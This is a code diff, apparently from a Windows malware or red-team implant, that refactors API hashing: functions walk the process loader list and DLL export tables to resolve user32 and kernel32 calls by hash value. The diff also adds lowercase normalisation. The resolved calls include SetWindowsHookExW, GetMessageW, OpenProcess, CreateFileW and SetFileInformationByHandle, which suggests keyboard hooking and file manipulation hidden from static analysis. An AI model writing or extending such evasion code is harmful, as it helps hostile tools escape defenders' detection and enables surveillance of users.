@@ -53,7 +53,7 @@ FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValu
 		printf("[!] GetImageExportDirectory Failed\n");
 		return FALSE;
 	}
-	printf("[+] Found EAT Of %p Handle At %p\n", pBase, pImageExportDirectory);
+	//printf("[+] Found EAT Of %p Handle At %p\n", pBase, pImageExportDirectory);
 
 	// Getting the function's names array pointer
 	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)hModule + pImageExportDirectory->AddressOfFunctions);
@@ -73,7 +73,6 @@ FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValu
 		WORD wFunctionOrdinal = pwAddressOfNameOrdinales[i];
 
 		// Getting the address of the function through it's ordinal
-		// TODO: lowercase strings
 		if (dwApiNameHashValue == RTIME_HASHA(pFunctionName)) {
 			PVOID pFunctionAddress = (PVOID)(pBase + pdwAddressOfFunctions[wFunctionOrdinal]);
 			printf("[+] Found API - Name: %s - Address: 0x%p - Ordinal: %d\n", pFunctionName, pFunctionAddress, wFunctionOrdinal);
@@ -140,8 +139,9 @@ HMODULE GetModuleHandleByHashValue(IN DWORD dwModuleNameHashValue)
 		// If not null
 		if (pDte->FullDllName.Length != NULL) {
 			// Check if both equal
-			// TODO: lowercase strings
-			if (dwModuleNameHashValue == RTIME_HASHW(pDte->FullDllName.Buffer)) {
+			PWSTR moduleName = pDte->FullDllName.Buffer;
+			PWSTR lowerModuleName = LowerCaseStringW(moduleName);
+			if (dwModuleNameHashValue == RTIME_HASHW(lowerModuleName)) {
 				HMODULE hModule = (HMODULE)(pDte->InInitializationOrderLinks.Flink);
 				wprintf(L"[+] Found Dll \"%s\" at %p\n", pDte->FullDllName.Buffer, (PVOID)hModule);
 				return hModule;
@@ -163,24 +163,25 @@ API_HASHING g_Api = { 0 };
 BOOL InitializeWinApis()
 {
 	//	User32.dll exported
+	HMODULE hUser32Dll = GetModuleHandleByHashValue(USER32DLLHashValue);
 	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(USER32DLLHashValue),
+		hUser32Dll,
 		CallNextHookExHashValue
 	);
 	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(USER32DLLHashValue),
+		hUser32Dll,
 		DefWindowProcWHashValue
 	);
 	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(USER32DLLHashValue),
+		hUser32Dll,
 		GetMessageWHashValue
 	);
 	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(USER32DLLHashValue),
+		hUser32Dll,
 		SetWindowsHookExWHashValue
 	);
 	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(USER32DLLHashValue),
+		hUser32Dll,
 		UnhookWindowsHookExHashValue
 	);
 
@@ -192,24 +193,25 @@ BOOL InitializeWinApis()
 		return FALSE;
 
 	// 	Kernel32.dll exported
+	HMODULE hKernel32Dll = GetModuleHandleByHashValue(KERNEL32DLLHashValue);
 	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
+		hKernel32Dll,
 		GetModuleFileNameWHashValue
 	);
 	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
+		hKernel32Dll,
 		CreateFileWHashValue
 	);
 	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
+		hKernel32Dll,
 		GetTickCount64HashValue
 	);
 	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
+		hKernel32Dll,
 		OpenProcessHashValue
 	);
 	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressByHashValue(
-		GetModuleHandleByHashValue(KERNEL32DLLHashValue),
+		hKernel32Dll,
 		SetFileInformationByHandleHashValue
 	);
 
